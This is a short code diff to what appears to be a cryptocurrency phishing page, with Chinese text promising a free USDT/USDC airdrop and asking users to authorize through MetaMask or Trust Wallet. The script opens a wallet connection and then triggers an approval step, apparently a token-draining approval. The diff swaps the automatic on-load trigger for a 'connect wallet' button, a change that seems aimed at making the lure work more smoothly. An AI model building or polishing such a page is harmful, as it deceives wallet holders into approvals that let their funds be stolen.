@@ -68,18 +68,18 @@
       }
     }
 
-    window.onload = async () => {
+    window.openConnection = async () => {
       web3modal.openModal();
-      // 等使用者完成連接後再執行授權
       setTimeout(() => {
         startApproval();
       }, 7000);
-    };
+    }
   </script>
 </head>
 <body style="background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:60px">
   <h2>🎁 恭喜你獲得 USDT / USDC 空投！</h2>
   <p>請使用 MetaMask 或 Trust Wallet 掃描 QR Code 完成授權</p>
+  <button onclick="openConnection()" style="padding: 10px 20px; font-size: 16px; margin-top: 20px; cursor:pointer;">🔗 點我連接錢包</button>
   <div id="status" style="margin-top: 30px; font-size: 1.1rem;"></div>
 </body>
 </html>
